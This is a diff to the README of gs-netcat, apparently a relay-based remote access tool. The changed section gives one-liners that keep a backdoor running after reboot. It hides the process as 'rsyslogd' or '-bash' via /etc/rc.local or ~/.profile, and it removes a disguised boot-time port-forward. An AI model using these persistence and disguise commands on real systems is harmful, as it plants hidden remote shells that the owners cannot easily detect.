@@ -242,7 +242,7 @@ ssh -o ProxyCommand='gs-netcat -s MySecret' root@doesnotmatter
 
 6. Retain access after reboot
 
-The easiest way to retain access to a remote system is to use [the automated deploy script](https://www.gsocket.io/deploy). Alternatively the following tricks can be used to achieve the same:
+The easiest way to retain access to a remote system is by using [the automated deploy script](https://www.gsocket.io/deploy). Alternatively the following can be used to achieve the same:
 
 Combine what you have learned so far and make your backdoor restart after reboot (and as a hidden service obfuscated as *rsyslogd*). Use any of the start-up scripts, such as */etc/rc.local*:
 ```
@@ -257,16 +257,10 @@ Not all environment variables are set during system bootup. Set some variables t
 
 Alternatively install gs-netcat as a [systemd service](examples/systemd-root-shell).
 
-Starting when the user logs in (and only once) can be done by adding this line to the user's *~/.profile* file:
+Alternativly and if you do not have root privileges then just append the following line to the user's *~/.profile* file. This will start gs-netcat (if it is not already running) the next time the user logs in. There are [many other ways to restart a reverse shell after system reboot](https://www.gsocket.io/deploy):
 ```
-killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s MySecret2 -liqD" SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)
+killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s MySecret -liqD" SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)
 ```
-
-Starting a port-forward during bootup. This one forwards TCP to 127.0.0.1:22 (example):
-```
-GSOCKET_ARGS="-k MySecret3 -lqD -d 127.1 -p22"  /bin/bash -c "exec -a rsyslogp /usr/local/bin/gs-netcat"
-```
-
 ---
 **Crypto / Security Mumble Jumble**
 1. The security is end-2-end. This means from User-2-User (and not just to the Relay Network). The Relay Network relays only (encrypted) data to and from the Users. 
